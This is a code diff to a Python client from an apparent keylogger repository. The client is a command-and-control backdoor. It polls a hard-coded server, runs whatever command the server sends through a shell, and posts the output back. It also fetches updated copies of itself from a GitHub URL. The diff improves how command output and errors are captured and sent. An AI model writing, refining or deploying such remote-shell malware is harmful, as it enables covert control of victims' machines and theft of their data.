@@ -5,7 +5,7 @@ import os
 import sys
 
 # Constants
-SERVER_URL = 'http://192.168.15.16:8080'  # Server IP and changed port to 8080
+SERVER_URL = 'http://192.168.15.16:8080'  # Server IP and port
 GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
 LOCAL_PATH = os.path.abspath(__file__)
 
@@ -26,19 +26,27 @@ def check_for_updates():
 def communicate_with_server():
     try:
         req = requests.get(SERVER_URL, timeout=5)
-        print(f'[Client] Successfully connected to server: {SERVER_URL}')  # Added debug
+        print(f'[Client] Successfully connected to server: {SERVER_URL}')
         c2_command = req.text
-        print(f'[Client] Received command: {c2_command}')  # For debugging purposes
+        print(f'[Client] Received command: {c2_command}')
+        
         if 'terminate' in c2_command:
             print('[Client] Terminate command received. Exiting...')
             sys.exit()
         else:
-            CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            response = CMD.stdout.read()
-            print(f'[Client] Sending response: {response.decode()}')  # For debugging purposes
-            requests.post(SERVER_URL, data=response)
-    except (requests.ConnectionError, requests.Timeout):
-        print("[Client] Server not available. Reconnecting...")
+            # Execute the command and read the entire output
+            CMD = subprocess.Popen(c2_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            output, error = CMD.communicate()
+            response_data = output if output else error  # Send back the output or error
+            
+            if response_data.strip() == "":
+                response_data = "Command produced no output."
+
+            # Send the response back to the server
+            print(f'[Client] Sending response: {response_data}')  # For debugging
+            requests.post(SERVER_URL, data=response_data.encode())
+    except (requests.ConnectionError, requests.Timeout) as e:
+        print(f"[Client] Server not available. Reconnecting... {e}")
 
 if __name__ == "__main__":
     # Continuous loop for checking server and updating
